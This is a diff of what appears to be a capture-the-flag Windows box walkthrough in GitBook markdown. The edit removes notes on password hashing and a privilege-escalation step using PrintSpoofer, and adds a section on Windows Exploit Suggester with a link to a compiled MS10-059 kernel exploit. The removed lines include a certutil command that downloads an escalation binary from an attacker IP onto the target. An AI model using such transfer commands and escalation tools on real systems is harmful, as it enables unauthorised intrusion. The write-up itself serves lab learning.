@@ -109,22 +109,6 @@ As you can see, there's a password that's encrypted, so we should crack it.
 happyday
 ```
 
-
-
-From my understanding, essentially whatever password you type, it takes the encrypted form of it and checks if it matches the valid one. Which is why when you type a password, or just hit login, you get this weird string of weird numbers and letters
-
-![](<../../../../.gitbook/assets/image (1) (1).png>)
-
-Here I'm typing in `password`
-
-![](<../../../../.gitbook/assets/image (74).png>)
-
-![](<../../../../.gitbook/assets/image (76).png>)
-
-It's the same length, however it didn't get cracked. However I believe, theoretically, this is how it works.
-
-![](<../../../../.gitbook/assets/image (75).png>)
-
 &#x20;Because we have a password, we can log in!
 
 ![](<../../../../.gitbook/assets/image (15).png>)
@@ -181,25 +165,15 @@ System Type:               x64-based PC
 
 ![](<../../../../.gitbook/assets/image (16).png>)
 
-A couple of options we could use here are either Juicy Potato or PrintSpoofer
-
-I will try PrintSpoofer since it is easier and quicker
-
-{% embed url="https://github.com/itm4n/PrintSpoofer" %}
-
-I'll transfer it to the target machine
-
-```
-certutil.exe -urlcache -f http://10.10.14.14/PrintSpoofer64.exe PrintSpoofer64.exe
-```
-
-![](<../../../../.gitbook/assets/image (11).png>)
 
 
+## Windows Exploit Suggester
 
+![](<../../../../.gitbook/assets/image (3).png>)
 
+{% embed url="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled" %}
 
-
+I've seen online people using this, however I cannot get it work
 
 ## Resources
 
